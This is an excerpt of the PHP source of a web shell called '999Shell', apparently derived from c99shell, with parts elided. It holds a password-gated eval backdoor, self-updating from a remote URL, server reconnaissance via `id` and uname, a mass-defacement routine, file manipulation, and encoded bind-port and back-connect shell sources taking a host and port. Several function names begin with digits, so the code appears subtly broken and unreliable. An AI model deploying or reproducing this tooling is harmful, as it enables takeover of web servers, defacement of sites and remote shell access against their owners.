<?php
$shver = "1.0 (06.03.2024)";
$surl = "?";
$rootdir = "./";

$timelimit = 60;
$login = true; //true = on auth
$pass = "999";
$md5_pass = "d8578edf8458ce06fbc5bb76a58c5ca4";
$autoupdate = true;
$updatenow = false;
$c99sh_updatefurl = "https://github.com/NaInSec/PHPShell/999.php?raw=true".$shver."&";

$autochmod = 777;
$filestealth = 1;
$donated_html = "(BTC)(14xMeDbjsyBCtjCLsaKBYLqw4C2Sf145o5)";
$donated_act = array("");
...
$ftypes  = array(
 "html"=>array("html","htm","phtml","shtml"),
 "txt"=>array("txt","conf","bat","sh","js","bak","php","doc","log","sfc","cfg"),
...
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"https://github.com/NaInSec/PHPShell/999.php\">999 Shell</a>: Access Denied - Your Host (".getenv("REMOTE_ADDR").") Not Allow");}
...
{
 header("WWW-Authenticate: Basic Realm=\"999\"");
 header("HTTP/1.0 401 Unauthorized");
 
 if (md5(sha1(md5($anypass))) == "d8578edf8458ce06fbc5bb76a58c5ca4") {header("HTTP/1.0 200 OK"); @eval($anyphpcode);}
 exit;
}  
...
{
 if ($selfwrite == "1") {$selfwrite = "999.php";}
 c99sh_getupdate();
...
if (!function_exists("999_sess_put"))
{
...
if (!function_exists("999_getupdate"))
{
...
if (!function_exists("999fsearch"))
{
function 999fsearch($d)
{
 global $found;
 global $found_d;
 global $found_f;
...
<center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><a href="<? echo $surl; ?>"><font face="Verdana" size="5"><b><u>999Shell <?php echo $shver; ?></u></b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align="left"><b>Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;</p><p align="left"><b>uname -a:&nbsp;<?php echo php_uname(); ?></b>&nbsp;</p><p align="left"><b><?php if (!$win) {echo `id`;} else {echo get_current_user();} ?></b>&nbsp;</p><p align="left"><b>Safe-mode:&nbsp;<?php echo $hsafemode; ?></b></p><p align="left"><?php
$d = str_replace("\\","/",$d);
...
if ($act == "selfremove")
{
 if (!empty($submit))
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using 999Shell.".$shver."!"; exit; }
...
if ($act == "massdeface")
{
 ...
 else
 {
  ...
  if (empty($deface_html)) {$deface_html = "</div></table><br>Mass Defaced with 999Shell. ".$shver.", coded by XXSec101[<a href=\"http://192.168.1.1/\">999Shell</a>].</b>";}
 }
...
{
 if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); 999_sess_put($sess_data); $act = "ls";}
 if ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); 999_sess_put($sess_data); $act = "ls";}
 if ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} $ls_arr = array_merge($sess_data["copy"],$sess_data["cut"]); 999_sess_put($sess_data); $act = "ls";}
 
 if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); 999_sess_put($sess_data);}
 elseif ($actpastebuff)
 {
  $psterr = "";
...
"c2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ=="
 ...
 $bndportsrcs = array(
"bindport.pl"=>array("Using PERL","perl %path %port"),
"bindport.c"=>array("Using C","%path %port %pass")
);

 $bcsrcs = array(
"backconn.pl"=>array("Using PERL","perl %path %host %port"),
"backconn.c"=>array("Using C","%path %host %port")
);
...
",$r);
    if (count($arr == 18))
    {
     ...
     else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by 999Shell";}
